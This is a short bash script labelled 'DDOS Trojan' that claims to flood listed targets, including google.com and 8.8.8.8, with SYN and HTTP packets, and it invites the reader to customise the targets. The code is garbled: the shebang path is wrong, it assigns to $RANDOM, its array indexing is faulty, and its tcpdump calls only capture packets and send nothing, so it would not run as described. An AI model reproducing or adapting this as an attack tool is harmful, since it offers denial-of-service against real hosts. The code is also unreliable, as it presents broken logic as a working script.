#!/bin/bin/bash

#DDOS Trojan (Shell Script)

# Define Attack Targets
TARGETS=("192.168.1.1" "8.8.8.8" "google.com") # Example targets - customize this!

# Define Attack Parameters
PACKET_SIZE="1472"  # Typical HTTP packet size, adjust if needed
COUNT=50000         # Number of packets to send per target
SLEEP=1             # Sleep time between bursts (seconds)
DELAY=30            # Delay before next attack round (seconds)

# Function to Send a Single Packet
send_packet() {
    local packet=$TARGETS[$RANDOM % 5] # Randomly select a target

    echo "Attack started against: $packet"

    # Generate TCP SYN packets (small burst for initial handshake)
    for i in $(seq 1 "$COUNT"); do
        $RANDOM="$(($i * 30))"
        echo -e "$(( RANDOM % 256 ))" > random_byte.txt # Save the bytes to random_byte.txt

        # Create a packet using the saved byte value
        ip=$packet | grep "192.168.1." > /dev/null
        if (( $RANDOM >= 0 && $RANDOM < 5 )) then
            # HTTP GET request (to keep connection alive)
            echo -e "$(( RANDOM % 100000 ))" > random_number.txt # Save a number to random_number.txt

            # Build the Packet and Send it
            tcp = "6 <$($cat random_number.txt)|bc -d)"
            echo "$packet $tcp" > packet.txt
            sudo tcpdump -n -i eth0 file.txt # Capture packets using tcpdump (adjust interface as needed)
        else
            # TCP SYN packet (basic handshake request)
            echo "SYN" > packet.txt # Append a SYN to the packet
            sudo tcpdump -n -i eth0 file.txt
        fi

    done
}


# Function for Attack Round
attack_round() {
    for target in $TARGETS; do
        if (( (RANDOM % 2) == 0 )) then
            send_packet # Send a burst of HTTP packets
        else
            sleep "$SLEEP" &
            break  # Break out of the loop for the current round if we found a random break point
        fi

    done
}


# Attack Logic (Main Loop)
while ((RANDOM % 10 == 0)); do # Run attacks every 10 seconds. Adjust for desired frequency.
    echo "Attack Round Started..."
    attack_round &
    sleep "$DELAY"
    echo "Waiting for round to finish..."
done

echo "DDOS Attack Complete (hopefully!)"
